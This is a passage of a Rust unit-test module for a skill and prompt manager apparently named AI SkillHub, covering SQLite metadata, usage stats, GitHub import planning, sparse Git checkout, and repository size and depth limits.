            .expect("release-preflight folder should be created");
        fs::create_dir_all(reports.join("share-recipient-test"))
            .expect("share-recipient-test folder should be created");
        fs::create_dir_all(reports.join("zip-preview-test"))
            .expect("zip-preview-test folder should be created");

        fs::write(
            reports.join("latest-diagnostics.json"),
            r#"{"overallStatus":"ok","appVersion":"v1.1.1","generatedAt":"2026-05-27T00:00:00+09:00","summary":{"checks":3,"ok":2,"warn":1,"error":0,"info":0}}"#,
        )
        .expect("diagnostics report should be written");
        fs::write(
            reports
                .join("release-preflight")
                .join("latest-release-preflight.json"),
            r#"{"ok":true,"overallStatus":"ok","version":"v1.1.1","packageName":"AI SkillHub.exe","generatedAt":"2026-05-27T00:00:00+09:00","checks":[{"status":"ok"},{"status":"ok"}]}"#,
        )
        .expect("release preflight report should be written");
        fs::write(
            reports
                .join("share-recipient-test")
                .join("latest-share-recipient-test.json"),
            r#"{"ok":true,"appVersion":"v1.1.1","generatedAt":"2026-05-27T00:00:00+09:00","cases":[{"ok":true,"status":"ok"},{"ok":true,"status":"warn"}]}"#,
        )
        .expect("share recipient report should be written");
        fs::write(
            reports
                .join("zip-preview-test")
                .join("latest-zip-preview-test.json"),
            r#"{"ok":true,"generatedAt":"2026-05-27T00:00:00+09:00","result":{"previewOk":true,"safeExtracted":true,"traversalBlocked":true,"previewSkillCount":2}}"#,
        )
        .expect("zip preview report should be written");

        let release_reports = derive_release_reports(&root);
        let ids = release_reports
            .iter()
            .map(|report| report.id.as_str())
            .collect::<Vec<_>>();

        assert_eq!(release_reports.len(), 4);
        assert!(ids.contains(&"diagnostics"));
        assert!(ids.contains(&"release-preflight"));
        assert!(ids.contains(&"share-recipient"));
        assert!(ids.contains(&"zip-preview"));
        assert!(release_reports.iter().all(|report| report.ok));
        assert!(release_reports
            .iter()
            .all(|report| !report.summary.contains("D:\\")));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn desktop_qa_checks_seed_and_preserve_sqlite_status() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-desktop-qa-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let checks =
            read_indexed_desktop_qa_checks(&connection).expect("desktop QA checks should read");

        assert_eq!(checks.len(), desktop_qa_catalog().len());
        assert!(checks.iter().all(|check| check.status == "pending"));

        connection
            .execute(
                "UPDATE desktop_qa_checks SET status = 'passed', updated_at = 'test' WHERE id = 'window-readable'",
                [],
            )
            .expect("desktop QA status should update");
        drop(connection);

        let connection = open_index_database(&root).expect("test sqlite should reopen");
        let checks =
            read_indexed_desktop_qa_checks(&connection).expect("desktop QA checks should reread");
        let window_check = checks
            .iter()
            .find(|check| check.id == "window-readable")
            .expect("window QA check should exist");

        assert_eq!(window_check.status, "passed");

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn skill_metadata_overrides_are_read_from_sqlite() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-skill-meta-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let timestamp = unix_timestamp_string();

        connection
            .execute(
                "INSERT INTO skills (
                    id, source_id, name, folder_name, description, category_id,
                    health_status, health_summary, enabled, relative_path,
                    created_at, updated_at
                ) VALUES (
                    'skill-paper-workflow', NULL, 'paper-workflow', 'paper-workflow',
                    'Original description', 'auto', 'ok', '', 1,
                    'skills\\paper-workflow', ?1, ?1
                )",
                params![timestamp],
            )
            .expect("skill row should be inserted");

        set_skill_metadata_override_in_connection(
            &connection,
            "paper-workflow",
            "Paper Workflow Plus",
            "论文科研",
            "Updated description",
            "常用入口",
        )
        .expect("metadata override should save");

        let skills = read_indexed_skills(&connection).expect("skills should read");
        let skill = skills
            .iter()
            .find(|item| item.folder_name == "paper-workflow")
            .expect("skill should exist");

        assert_eq!(skill.name, "Paper Workflow Plus");
        assert_eq!(skill.category, "论文科研");
        assert_eq!(skill.description, "Updated description");
        assert_eq!(skill.note, "常用入口");

        set_skill_enabled_override_in_connection(&connection, "paper-workflow", false)
            .expect("enabled override should save");

        let skills = read_indexed_skills(&connection).expect("skills should reread");
        let skill = skills
            .iter()
            .find(|item| item.folder_name == "paper-workflow")
            .expect("skill should still exist");

        assert!(!skill.enabled);

        set_skill_rating_override_in_connection(&connection, "paper-workflow", 5)
            .expect("rating override should save");
        let skills = read_indexed_skills(&connection).expect("rated skills should reread");
        let skill = skills
            .iter()
            .find(|item| item.folder_name == "paper-workflow")
            .expect("rated skill should still exist");
        assert_eq!(skill.rating, 5);

        set_skill_rating_override_in_connection(&connection, "paper-workflow", 0)
            .expect("rating override should clear");
        let skills = read_indexed_skills(&connection).expect("cleared rating should reread");
        assert_eq!(
            skills
                .iter()
                .find(|item| item.folder_name == "paper-workflow")
                .expect("cleared skill should still exist")
                .rating,
            0
        );
        assert!(set_skill_rating_override_in_connection(&connection, "paper-workflow", 6).is_err());
        assert!(read_indexed_audit_events(&connection)
            .expect("audit events should read")
            .iter()
            .any(|event| event.event_type == "skill_rating_updated"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn indexed_reader_hides_legacy_orphan_router_rows() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-orphan-router-read-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let timestamp = unix_timestamp_string();

        for (id, name, path, is_router_hub, description) in [
            (
                "skill-orphan-router",
                "collection-reviewer",
                "app-next\\data\\github_sources\\AI-SkillHub-local-routers\\collection-reviewer",
                1,
                "[CONFLICT-DISPATCHER] internal alias",
            ),
            (
                "skill-editor",
                "editor",
                "skills\\editor",
                0,
                "Standalone editing skill",
            ),
        ] {
            connection
                .execute(
                    "INSERT INTO skills (
                        id, source_id, name, folder_name, description, category_id,
                        health_status, health_summary, enabled, relative_path,
                        created_at, updated_at, is_router_hub
                    ) VALUES (?1, NULL, ?2, ?2, ?3, 'auto', 'ok', '', 1, ?4, ?5, ?5, ?6)",
                    params![id, name, description, path, timestamp, is_router_hub],
                )
                .expect("legacy skill row should be inserted");
        }

        let skills = read_indexed_skills(&connection).expect("skills should read");

        assert_eq!(skills.len(), 1);
        assert_eq!(skills[0].name, "editor");

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn source_metadata_overrides_are_read_from_sqlite() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-source-meta-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let timestamp = unix_timestamp_string();

        connection
            .execute(
                "INSERT INTO sources (
                    id, name, source_type, url, local_path, install_mode,
                    category_id, note, enabled, created_at, updated_at
                ) VALUES (
                    'source-impeccable', 'impeccable', 'skill',
                    'https://github.com/pbakaus/impeccable.git', '',
                    'scan', 'auto', '', 1, ?1, ?1
                )",
                params![timestamp],
            )
            .expect("source row should be inserted");

        set_source_metadata_override_in_connection(
            &connection,
            "source-impeccable",
            "impeccable-ui",
            "mixed",
            "界面设计",
            "UI design reference",
            false,
        )
        .expect("source override should save");
        set_source_rating_override_in_connection(&connection, "source-impeccable", 5)
            .expect("parent/source rating should save");

        let sources = read_indexed_sources(&connection).expect("sources should read");
        let source = sources
            .iter()
            .find(|item| item.id == "source-impeccable")
            .expect("source should exist");

        assert_eq!(source.name, "impeccable-ui");
        assert_eq!(source.source_type, "mixed");
        assert_eq!(source.category_id, "界面设计");
        assert_eq!(source.note, "UI design reference");
        assert!(!source.enabled);
        assert_eq!(source.rating, 5);
        assert!(
            set_source_rating_override_in_connection(&connection, "source-impeccable", 6).is_err()
        );

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn source_bulk_metadata_updates_selected_sources_only() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-source-bulk-meta-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let timestamp = unix_timestamp_string();

        for (id, name) in [
            ("source-paper", "paper-skills"),
            ("source-design", "design-skills"),
        ] {
            connection
                .execute(
                    "INSERT INTO sources (
                        id, name, source_type, url, local_path, install_mode,
                        category_id, note, enabled, created_at, updated_at
                    ) VALUES (
                        ?1, ?2, 'skill', '', ?3, 'scan', 'auto', '', 1, ?4, ?4
                    )",
                    params![
                        id,
                        name,
                        format!("app-next/data/github_sources/{}", name),
                        timestamp
                    ],
                )
                .expect("source row should insert");
        }

        let updated = set_sources_bulk_metadata_in_connection(
            &connection,
            &["source-paper".to_string()],
            "paper-research",
            Some(false),
        )
        .expect("bulk source metadata should save");
        assert_eq!(updated, 1);

        let sources = read_indexed_sources(&connection).expect("sources should read");
        let paper = sources
            .iter()
            .find(|item| item.id == "source-paper")
            .expect("paper source should exist");
        let design = sources
            .iter()
            .find(|item| item.id == "source-design")
            .expect("design source should exist");

        assert_eq!(paper.category_id, "paper-research");
        assert!(!paper.enabled);
        assert_eq!(design.category_id, "auto");
        assert!(design.enabled);
        assert!(read_indexed_audit_events(&connection)
            .expect("audit events should read")
            .iter()
            .any(|event| event.event_type == "source_bulk_metadata_updated"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn usage_events_aggregate_into_local_stats() {
        let root =
            std::env::temp_dir().join(format!("skillhub-usage-test-{}", unix_timestamp_string()));
        let connection = open_index_database(&root).expect("test sqlite should open");

        record_usage_event_row_in_connection(
            &connection,
            "skill",
            "paper-workflow",
            "paper-workflow",
            "Nature-Paper-Skills",
            "skill_call",
        )
        .expect("usage event should save");
        record_usage_event_row_in_connection(
            &connection,
            "skill",
            "paper-workflow",
            "paper-workflow",
            "Nature-Paper-Skills",
            "skill_call",
        )
        .expect("second usage event should save");
        record_usage_event_row_in_connection(
            &connection,
            "skill",
            "academic-paper-reviewer",
            "academic-paper-reviewer",
            "academic-research-skills",
            "copy_prompt",
        )
        .expect("copy prompt event should save");
        record_usage_event_row_in_connection(
            &connection,
            "source",
            "source-impeccable",
            "impeccable",
            "impeccable",
            "open_source",
        )
        .expect("source usage event should save");

        let stats = read_indexed_usage_stats(&connection).expect("usage stats should read");
        let skill_stat = stats
            .iter()
            .find(|item| item.target_type == "skill" && item.target_id == "paper-workflow")
            .expect("skill usage should aggregate");

        assert_eq!(skill_stat.total_count, 2);
        assert!(skill_stat.seven_day_count >= 2);
        assert!(
            stats
                .iter()
                .all(|item| item.target_id != "academic-paper-reviewer"),
            "copying a prompt in the UI must not count as a real Skill invocation"
        );
        assert!(
            stats.iter().all(
                |item| !(item.target_type == "source" && item.target_id == "source-impeccable")
            ),
            "opening or editing a source must not count as local Skill invocation"
        );
        assert!(read_indexed_audit_events(&connection)
            .expect("audit events should read")
            .iter()
            .any(|event| event.event_type == "usage_recorded"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn parse_github_repo_accepts_common_repo_urls() {
        assert_eq!(
            parse_github_repo("https://github.com/pbakaus/impeccable.git"),
            Some(("pbakaus".to_string(), "impeccable".to_string()))
        );
        assert_eq!(
            parse_github_repo("git@github.com:Boom5426/Nature-Paper-Skills.git"),
            Some(("Boom5426".to_string(), "Nature-Paper-Skills".to_string()))
        );
        assert_eq!(
            parse_github_repo("ssh://git@github.com/Yuan1z0825/nature-skills.git"),
            Some(("Yuan1z0825".to_string(), "nature-skills".to_string()))
        );

        assert_eq!(
            parse_github_repo("https://example.com/owner/repo.git"),
            None
        );
        assert_eq!(
            parse_github_repo("https://github.com/owner/repo/extra"),
            None
        );
        assert_eq!(
            parse_github_repo("https://github.com/owner/repo.git invalid"),
            None
        );
    }

    #[test]
    fn source_url_hydration_reads_git_origin() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-source-origin-test-{}",
            unix_timestamp_string()
        ));
        let repo_dir = root
            .join("app-next")
            .join("data")
            .join("github_sources")
            .join("paper-framework-figure-studio-pro");
        fs::create_dir_all(repo_dir.join(".git")).expect("test git folder should be created");
        fs::write(
            repo_dir.join(".git").join("config"),
            "[remote \"origin\"]\n    url = https://github.com/c-narcissus/paper-framework-figure-studio-pro.git\n",
        )
        .expect("test git config should be written");

        let mut sources = vec![SourceCard {
            id: "paper-framework-figure-studio-pro".to_string(),
            name: "paper-framework-figure-studio-pro".to_string(),
            source_type: "skill".to_string(),
            health: "ok".to_string(),
            url: String::new(),
            skill_count: 1,
            mode: "scan".to_string(),
            category_id: "scientific-figures".to_string(),
            note: String::new(),
            local_path: "app-next/data/github_sources/paper-framework-figure-studio-pro"
                .to_string(),
            enabled: true,
            rating: 0,
            tags: Vec::new(),
            created_at: unix_timestamp_string(),
            usage_guide: String::new(),
            metadata_origin: "test".to_string(),
            metadata_confidence: 1.0,
            user_folder_id: String::new(),
            user_folder_name: String::new(),
            user_folder_color: String::new(),
        }];

        hydrate_source_urls_from_git(&root, &mut sources);

        assert_eq!(
            sources[0].url,
            "https://github.com/c-narcissus/paper-framework-figure-studio-pro.git"
        );
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn source_import_plan_detects_duplicate_github_url() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-import-github-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let timestamp = unix_timestamp_string();

        connection
            .execute(
                "INSERT INTO sources (
                    id, name, source_type, url, local_path, install_mode,
                    category_id, note, enabled, created_at, updated_at
                ) VALUES (
                    'source-impeccable', 'impeccable', 'skill',
                    'https://github.com/pbakaus/impeccable.git', '',
                    'scan', 'ui-design', '', 1, ?1, ?1
                )",
                params![timestamp],
            )
            .expect("source should insert");

        let plan = build_source_import_plan(
            &root,
            &connection,
            "github",
            "git@github.com:pbakaus/impeccable.git",
        )
        .expect("import plan should build");

        assert_eq!(plan.status, "warn");
        assert_eq!(plan.duplicate_source_id, "source-impeccable");
        assert!(plan.safe_to_continue);
        assert!(plan.duplicate_reason.contains("已存在同源"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn source_import_plan_counts_local_skill_dirs_without_writing() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-import-local-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let local_source = root.join("local-pack");
        let skill_dir = local_source.join("paper-workflow");
        let docs_dir = local_source.join("prompt-docs");
        fs::create_dir_all(&skill_dir).expect("skill dir should create");
        fs::create_dir_all(&docs_dir).expect("docs dir should create");
        fs::write(skill_dir.join("SKILL.md"), "# Paper Workflow").expect("skill file should write");
        fs::write(docs_dir.join("README.md"), "# Prompt notes").expect("prompt file should write");

        let plan =
            build_source_import_plan(&root, &connection, "local", &local_source.to_string_lossy())
                .expect("local import plan should build");

        assert_eq!(plan.status, "ready");
        assert_eq!(plan.skill_count, 1);
        assert!(plan.prompt_count >= 1);
        assert!(plan.safe_to_continue);
        assert!(plan.rollback_summary.contains("没有复制"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn source_import_plan_counts_paperspine_dist_skill_suite() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-import-paperspine-dist-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let local_source = root.join("PaperSpine");
        let codex_skill_dir = local_source
            .join("dist")
            .join("codex")
            .join("skills")
            .join("paper-spine");
        let claude_skill_dir = local_source
            .join("dist")
            .join("claude")
            .join("skills")
            .join("paper-spine-ui");
        fs::create_dir_all(&codex_skill_dir).expect("codex skill dir should create");
        fs::create_dir_all(&claude_skill_dir).expect("claude skill dir should create");
        fs::write(codex_skill_dir.join("SKILL.md"), "# PaperSpine")
            .expect("codex skill should write");
        fs::write(claude_skill_dir.join("SKILL.md"), "# PaperSpine UI")
            .expect("claude skill should write");

        let plan =
            build_source_import_plan(&root, &connection, "local", &local_source.to_string_lossy())
                .expect("paperspine import plan should build");

        assert_eq!(plan.status, "ready");
        assert_eq!(plan.skill_count, 2);
        assert!(plan.safe_to_continue);

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn github_api_selection_keeps_skill_folders_or_complete_prompt_workspace() {
        let skill_tree = serde_json::json!({
            "tree": [
                { "path": "assets/large.png", "type": "blob", "mode": "100644", "size": 9000 },
                { "path": "scientific-figure-making/SKILL.md", "type": "blob", "mode": "100644", "size": 400 },
                { "path": "scientific-figure-making/references/api.md", "type": "blob", "mode": "100644", "size": 800 },
                { "path": "README.md", "type": "blob", "mode": "100644", "size": 1000 }
            ]
        });
        let selected =
            select_github_repository_files(&skill_tree).expect("skill tree should select");
        assert_eq!(selected.len(), 2);
        assert!(selected
            .iter()
            .all(|file| file.path.starts_with("scientific-figure-making/")));

        let prompt_tree = serde_json::json!({
            "tree": [
                { "path": "images/demo.png", "type": "blob", "mode": "100644", "size": 9000 },
                { "path": "README.md", "type": "blob", "mode": "100644", "size": 1000 },
                { "path": "program.md", "type": "blob", "mode": "100644", "size": 600 },
                { "path": "train.py", "type": "blob", "mode": "100644", "size": 500 },
                { "path": "prepare.py", "type": "blob", "mode": "100644", "size": 500 }
            ]
        });
        let selected =
            select_github_repository_files(&prompt_tree).expect("prompt tree should select");
        assert_eq!(selected.len(), 5);
        assert!(selected.iter().any(|file| file.path == "train.py"));
        assert!(selected.iter().any(|file| file.path == "prepare.py"));
        assert!(selected.iter().any(|file| file.path == "images/demo.png"));
    }

    #[test]
    fn git_prompt_checkout_disables_markdown_only_sparse_mode() {
        if Command::new("git").arg("--version").output().is_err() {
            return;
        }
        let root = std::env::temp_dir().join(format!(
            "skillhub-prompt-git-checkout-{}",
            unix_timestamp_string()
        ));
        let staged = root.join("staged");
        fs::create_dir_all(&staged).expect("staged fixture should create");

        let run_git = |cwd: &Path, args: &[&str]| {
            let output = Command::new("git")
                .arg("-C")
                .arg(cwd)
                .args(args)
                .output()
                .expect("fixture git command should start");
            assert!(
                output.status.success(),
                "git {:?} failed: {}",
                args,
                String::from_utf8_lossy(&output.stderr)
            );
        };
        run_git(&staged, &["init"]);
        run_git(
            &staged,
            &["config", "user.email", "fixture@example.invalid"],
        );
        run_git(&staged, &["config", "user.name", "AI SkillHub Fixture"]);
        fs::write(staged.join("README.md"), "Prompt context").expect("README should write");
        fs::write(staged.join("program.md"), "Run train.py").expect("program should write");
        fs::write(staged.join("train.py"), "print('train')").expect("train should write");
        fs::write(staged.join("prepare.py"), "print('prepare')").expect("prepare should write");
        run_git(&staged, &["add", "."]);
        run_git(&staged, &["commit", "-m", "fixture"]);
        run_git(&staged, &["sparse-checkout", "set", "--no-cone", "/*.md"]);
        run_git(&staged, &["checkout", "--force", "HEAD"]);
        assert!(!staged.join("train.py").exists());

        let control = SourceImportControl::detached("prompt-full-checkout-test");
        let output = complete_sparse_skill_checkout("git", &staged, &control)
            .expect("Prompt checkout should complete");
        assert!(
            output.status.success(),
            "Prompt checkout failed: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        assert!(staged.join("program.md").is_file());
        assert!(staged.join("train.py").is_file());
        assert!(staged.join("prepare.py").is_file());
        let security = security_scan::scan_source_tree(&staged)
            .expect("complete Prompt workspace should pass through the full-tree scanner");
        assert_eq!(security.scanned_files, 4);
        assert_eq!(security.executable_files, 2);

        fs::remove_dir_all(root).expect("fixture should clean");
    }

    #[test]
    fn prompt_git_tree_preflight_blocks_oversized_blob_before_checkout() {
        if Command::new("git").arg("--version").output().is_err() {
            return;
        }
        let root = std::env::temp_dir().join(format!(
            "skillhub-prompt-git-tree-limit-{}",
            unix_timestamp_string()
        ));
        let repo = root.join("repo");
        fs::create_dir_all(&repo).expect("fixture repo should create");
        let run_git = |args: &[&str]| {
            let output = Command::new("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .output()
                .expect("fixture git command should start");
            assert!(output.status.success(), "git {:?} failed", args);
        };
        run_git(&["init"]);
        run_git(&["config", "user.email", "fixture@example.invalid"]);
        run_git(&["config", "user.name", "AI SkillHub Fixture"]);
        fs::write(repo.join("program.md"), "Prompt").expect("program should write");
        let oversized = repo.join("oversized.bin");
        let file = fs::File::create(&oversized).expect("oversized fixture should create");
        file.set_len(GITHUB_FALLBACK_MAX_FILE_BYTES + 1)
            .expect("oversized fixture should resize");
        drop(file);
        run_git(&["add", "."]);
        run_git(&["commit", "-m", "oversized fixture"]);

        let control = SourceImportControl::detached("prompt-tree-preflight-test");
        let error = validate_prompt_git_tree_before_checkout("git", &repo, &control)
            .expect_err("oversized committed blob must fail before checkout");
        assert!(error.contains("超过 16 MB"));

        fs::remove_dir_all(root).expect("fixture should clean");
    }

    #[test]
    fn staged_repository_bounds_fail_closed_above_depth_limit() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-prompt-depth-limit-{}",
            unix_timestamp_string()
        ));
        let mut nested = root.clone();
        for index in 0..12 {
            nested = nested.join(format!("level-{index}"));
        }
        fs::create_dir_all(&nested).expect("deep fixture should create");
        fs::write(nested.join("program.md"), "too deep").expect("fixture should write");

        let error = validate_staged_repository_bounds(&root)
            .expect_err("deep repositories must fail closed");
        assert!(error.contains("目录深度超过安全上限"));

        fs::remove_dir_all(root).expect("fixture should clean");
    }

    #[test]
    fn staged_repository_bounds_count_tracked_generated_directories() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-prompt-generated-dir-limit-{}",
            unix_timestamp_string()
        ));
        let generated = root.join("node_modules").join("fixture");
        fs::create_dir_all(&generated).expect("generated fixture should create");
        let oversized = generated.join("payload.bin");
        let file = fs::File::create(&oversized).expect("fixture file should create");
        file.set_len(GITHUB_FALLBACK_MAX_FILE_BYTES + 1)
            .expect("sparse fixture should resize");
        drop(file);

        let error = validate_staged_repository_bounds(&root)
            .expect_err("tracked generated directories must count toward limits");
        assert!(error.contains("超过 16 MB"));

        fs::remove_dir_all(root).expect("fixture should clean");
    }

    #[test]
    fn github_api_selection_accepts_bounded_multi_provider_repository() {
        let mut tree = Vec::with_capacity(1_850);
        tree.push(serde_json::json!({
            "path": ".agents/skills/impeccable/SKILL.md",
            "type": "blob",
            "mode": "100644",
            "size": 800
        }));
        for index in 1..1_850 {
            tree.push(serde_json::json!({
                "path": format!(".agents/skills/impeccable/references/file-{index}.md"),
                "type": "blob",
                "mode": "100644",
                "size": 120
            }));
        }
        let payload = serde_json::json!({ "tree": tree });
        let selected = select_github_repository_files(&payload)
            .expect("a bounded 1,850-file Skill repository should be accepted");
        assert_eq!(selected.len(), 1_850);
        assert!(selected.len() < SOURCE_IMPORT_MAX_FILES);
    }

    #[test]
    #[ignore = "network-dependent Impeccable compatibility gate"]
    fn github_codeload_stages_real_impeccable_repository_above_legacy_cap() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-impeccable-codeload-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test database should open");
        let plan = build_source_import_plan(
            &root,
            &connection,
            "github",
            "https://github.com/pbakaus/impeccable.git",
        )
        .expect("Impeccable plan should build");
        let staged_path = source_import_staging_root(&root).join("impeccable-codeload");

        let downloaded_ref = stage_github_source_import_via_codeload(&plan, &staged_path)
            .expect("the built-in codeload downloader should accept Impeccable");
        let (skill_count, _) =
            count_skill_dirs_in_path(&staged_path).expect("staged repository should scan");
        let copied_files = count_files_in_path(&staged_path).expect("staged files should count");
        let report =
            security_scan::scan_source_tree(&staged_path).expect("staged tree should scan safely");

        assert_eq!(downloaded_ref, "HEAD");
        assert!(skill_count >= 1);
        assert!(
            copied_files > 1_500,
            "the real repository should exercise the legacy 1,500-file failure path"
        );
        assert!(copied_files <= SOURCE_IMPORT_MAX_FILES + 1);
        assert!(report.scanned_files > 0);
        assert!(staged_path.join(MANAGED_SOURCE_METADATA_FILE).is_file());

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    #[ignore = "network-dependent ppt-master sparse clone compatibility gate"]
    fn github_sparse_git_stages_real_ppt_master_without_full_repository_checkout() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-ppt-master-sparse-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test database should open");
        let plan = build_source_import_plan(
            &root,
            &connection,
            "github",
            "https://github.com/hugohe3/ppt-master.git",
        )
        .expect("ppt-master plan should build");
        let staged_path = source_import_staging_root(&root).join("ppt-master-sparse");
        let mut execution = SourceImportExecutionCard {
            id: "ppt-master-sparse".to_string(),
            import_kind: "github".to_string(),
            input: plan.input.clone(),
            status: "blocked".to_string(),
            risk_level: "low".to_string(),
            summary: String::new(),
            staged_path: staged_path.display().to_string(),
            report_path: String::new(),
            manifest_path: String::new(),
            copied_files: 0,
            copied_bytes: 0,
            skill_count: 0,
            prompt_count: 0,
            blocking_checks: Vec::new(),
            rollback_steps: Vec::new(),
            real_write_scope: "staging-only".to_string(),
            download_method: String::new(),
            security_status: "not-run".to_string(),
            security_scanned_files: 0,
            security_findings: Vec::new(),
        };
        stage_github_source_import_with_control(
            &plan,
            &staged_path,
            &mut execution,
            &SourceImportControl::detached("ppt-master-sparse-test"),
        )
        .expect("sparse Git import should complete");

        assert_eq!(execution.download_method, "git");
        assert_eq!(execution.skill_count, 1);
        assert!(staged_path.join("skills/ppt-master/SKILL.md").is_file());
        assert!(!staged_path.join("examples").exists());
        let report = security_scan::scan_source_tree(&staged_path)
            .expect("the bounded Skill-only tree should pass scanner limits");
        assert!(report.scanned_files > 10_000);
        assert!(report.blocking_reasons.is_empty());
        assert!(
            report.safe_to_promote(),
            "ppt-master should not be blocked by false-positive high-risk findings: {:?}",
            report
                .findings
                .iter()
                .filter(|finding| finding.severity == "high")
                .take(8)
                .collect::<Vec<_>>()
        );

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    #[ignore = "network-dependent ppt-master release asset compatibility gate"]
    fn github_release_asset_stages_real_ppt_master_without_git_or_full_archive() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-ppt-master-release-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test database should open");
        let plan = build_source_import_plan(
            &root,
            &connection,
            "github",
            "https://github.com/hugohe3/ppt-master.git",
        )
        .expect("ppt-master plan should build");
        let staged_path = source_import_staging_root(&root).join("ppt-master-release");
        let result = stage_github_source_import_via_release_asset_with_control(
            &plan,
            &staged_path,
            &SourceImportControl::detached("ppt-master-release-test"),
        )
        .expect("the official Skill-only release asset should stage");

        assert!(!result.downloaded_ref.is_empty());
        assert!(staged_path
            .join("ppt-master/skills/ppt-master/SKILL.md")
            .is_file());
        assert!(!staged_path.join("examples").exists());
        let (skill_count, _) =
            count_skill_dirs_in_path(&staged_path).expect("release asset should index");
        assert_eq!(skill_count, 1);
        let report = security_scan::scan_source_tree(&staged_path)
            .expect("release Skill tree should stay inside scanner bounds");
        assert!(report.scanned_files > 10_000);
        assert!(report.safe_to_promote());

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn managed_source_metadata_recovers_github_url_without_git_folder() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-source-metadata-test-{}",
            unix_timestamp_string()
        ));
        let source_dir = active_sources_dir(&root).join("api-downloaded-source");
        fs::create_dir_all(&source_dir).expect("source dir should create");
        write_managed_source_metadata(
            &source_dir,
            "https://github.com/ChenLiu-1996/figures4papers.git",
            "github-api",
            "main",
        )
        .expect("metadata should write");
        let source = test_source_card("source-api", "api-downloaded-source", &source_dir, "");
        assert_eq!(
            infer_source_github_url(&root, &source).as_deref(),
            Some("https://github.com/ChenLiu-1996/figures4papers.git")
        );
        assert!(!source_dir.join(".git").exists());
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    #[ignore = "network-dependent recipient gate"]
    fn github_fallback_imports_real_skill_and_prompt_repositories_without_git() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-github-recipient-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test database should open");

        let figure_plan = build_source_import_plan(
            &root,
            &connection,
            "github",
            "https://github.com/ChenLiu-1996/figures4papers.git",
        )
        .expect("figure plan should build");
        let figure_stage = source_import_staging_root(&root).join("figures4papers-fallback");
        let mut figure_execution = SourceImportExecutionCard {
            id: "figure-no-git".to_string(),
            import_kind: "github".to_string(),
            input: figure_plan.input.clone(),
            status: "blocked".to_string(),
            risk_level: "low".to_string(),
            summary: String::new(),
            staged_path: figure_stage.display().to_string(),
            report_path: String::new(),
            manifest_path: String::new(),
            copied_files: 0,
            copied_bytes: 0,
            skill_count: 0,
            prompt_count: 0,
            blocking_checks: Vec::new(),
            rollback_steps: Vec::new(),
            real_write_scope: "staging-only".to_string(),
            download_method: String::new(),
            security_status: "not-run".to_string(),
            security_scanned_files: 0,
            security_findings: Vec::new(),
        };
        stage_github_source_import_with_git_program(
            &figure_plan,
            &figure_stage,
            &mut figure_execution,
            "ai-skillhub-test-missing-git.exe",
        )
        .expect("figure skill should download without Git");
        assert_eq!(
            figure_execution.status, "staged",
            "{:?}",
            figure_execution.blocking_checks
        );
        assert_eq!(figure_execution.download_method, "github-codeload");
        let (figure_skills, _) =
            count_skill_dirs_in_path(&figure_stage).expect("figure stage should scan");
        assert_eq!(figure_skills, 1);
        assert!(figure_stage
            .join("scientific-figure-making")
            .join("SKILL.md")
            .exists());
        assert!(!figure_stage.join(".git").exists());

        let prompt_plan = build_source_import_plan(
            &root,
            &connection,
            "github",
            "https://github.com/Leey21/awesome-ai-research-writing.git",
        )
        .expect("prompt plan should build");
        let prompt_stage = source_import_staging_root(&root).join("research-writing-fallback");
        let mut prompt_execution = SourceImportExecutionCard {
            id: "prompt-no-git".to_string(),
            import_kind: "github".to_string(),
            input: prompt_plan.input.clone(),
            status: "blocked".to_string(),
            risk_level: "low".to_string(),
            summary: String::new(),
            staged_path: prompt_stage.display().to_string(),
            report_path: String::new(),
            manifest_path: String::new(),
            copied_files: 0,
            copied_bytes: 0,
            skill_count: 0,
            prompt_count: 0,
            blocking_checks: Vec::new(),
            rollback_steps: Vec::new(),
            real_write_scope: "staging-only".to_string(),
            download_method: String::new(),
            security_status: "not-run".to_string(),
